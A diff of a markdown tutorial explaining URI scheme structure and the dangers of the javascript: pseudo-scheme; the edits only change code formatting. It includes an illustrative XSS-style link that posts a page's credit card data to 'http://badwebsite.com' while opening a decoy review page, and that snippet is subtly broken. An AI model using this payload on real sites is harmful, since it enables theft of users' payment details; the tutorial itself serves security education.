@@ -21,23 +21,23 @@ And a few you probably haven't put much thought into, or didn't know existed:
 
 URI schemes are the combination of a few separate parts, designed by third parties and adopted into major web browsers. All URI schemes have the following structure:
 
-```and://my:stuff@test.com:8080/location/sublocation?key=things&stuff=keys#section2```
+`and://my:stuff@test.com:8080/location/sublocation?key=things&stuff=keys#section2`
 
 Lets break this down into separate pieces before discussing where protocols can be a security issue.
 
-```and://``` - This is where the scheme is declared, and the browser first checks this in order to determine what to do with the following strings.
+`and://` - This is where the scheme is declared, and the browser first checks this in order to determine what to do with the following strings.
 
-```my:stuff``` - This is the "path" often used to express a hierarchy of data. You don't see this in very many URI's, but in older systems a scheme might declare username and password for an email as `joe:mypassword3`.
+`my:stuff` - This is the "path" often used to express a hierarchy of data. You don't see this in very many URI's, but in older systems a scheme might declare username and password for an email as `joe:mypassword3`.
 
-```@test.com``` - Is the host, you see this most frequently in http:// and https:// URI's. This is used to identify a relevant location.
+`@test.com` - Is the host, you see this most frequently in http:// and https:// URI's. This is used to identify a relevant location.
 
-```:8080``` - Here we declare the port. All websites and servers require a port to be declared, but you don't see it often in http:// or https:// URI's because browsers default to port 80 (invisibly) if no other port is declared in the URI.
+`:8080` - Here we declare the port. All websites and servers require a port to be declared, but you don't see it often in http:// or https:// URI's because browsers default to port 80 (invisibly) if no other port is declared in the URI.
 
-```location/sublocation``` - Refers to a file location on the host.
+`location/sublocation` - Refers to a file location on the host.
 
-```?key=things&things=keys``` - The query, used to pass through conditional data in the URI as if it was a variable.
+`?key=things&things=keys` - The query, used to pass through conditional data in the URI as if it was a variable.
 
-```#section``` - The URI fragment, also used to pass through conditional data. Typically used to preserve state on the client.
+`#section` - The URI fragment, also used to pass through conditional data. Typically used to preserve state on the client.
 
 Why do we need to worry about URI Schemes?
 ------------------------------------------
@@ -48,9 +48,9 @@ The most notorious of this, is the "**JavaScript Pseudo Scheme**" - a scheme tha
 
 You've probably seen this in code before, but not recognized it. The most common use case is:
 
-```<a href="javascript:void(0);">click me</a>```
+`<a href="javascript:void(0);">click me</a>`
 
-This trick has been used to create links that did not adhere to normal link behavior in many browsers. Really what's happening is the link is executing the statement ```void(0);``` which returns ```undefined```. Typically a browser will reload the page if a link to itself is clicked, but if the link returns undefined the browser will halt execution. Now you have a link to the current page which can call other JavaScript without causing a page reload.
+This trick has been used to create links that did not adhere to normal link behavior in many browsers. Really what's happening is the link is executing the statement `void(0);` which returns `undefined`. Typically a browser will reload the page if a link to itself is clicked, but if the link returns undefined the browser will halt execution. Now you have a link to the current page which can call other JavaScript without causing a page reload.
 
 This use case is generally harmless.
 
@@ -73,10 +73,10 @@ Jon devises a plan to craft a malicious link to put in his BuyStuffNow comment. 
 
 The link will be constructed as such:
 
-```
+`
 <a href="javascript:console.log(new XMLHttpRequest().open('POST',
 'http://badwebsite.com').send(document.querySelector('creditCardInfo'));
-window.open('http://www.legitreview.com/product');">this</a>```
+window.open('http://www.legitreview.com/product');">this</a>`
 
 To a uneducated user, this is simply a link to a legitimate review on another website. The user may enter their credit card information and than decide to read the review - in which case their credit card information is sent to a malicious web server and stored for malicious uses.
 
